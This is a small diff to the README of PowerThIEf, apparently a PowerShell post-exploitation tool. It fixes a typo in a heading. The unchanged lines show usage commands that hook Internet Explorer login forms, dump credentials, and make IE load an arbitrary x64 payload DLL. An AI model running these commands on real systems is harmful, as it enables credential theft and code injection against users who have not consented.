@@ -38,7 +38,7 @@ Invoke-PowerThIEf -action HookLoginForms
 Invoke-PowerThIEf -action Creds 
 ```
 
-## Make IExplore.exe launch a DLL of your chooising (must be x64)
+## Have IExplore.exe load a DLL of your choosing (must be x64)
 ### Launch the DLL(x64) specified by the PathPayload param in IE's process
 ```
 Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>
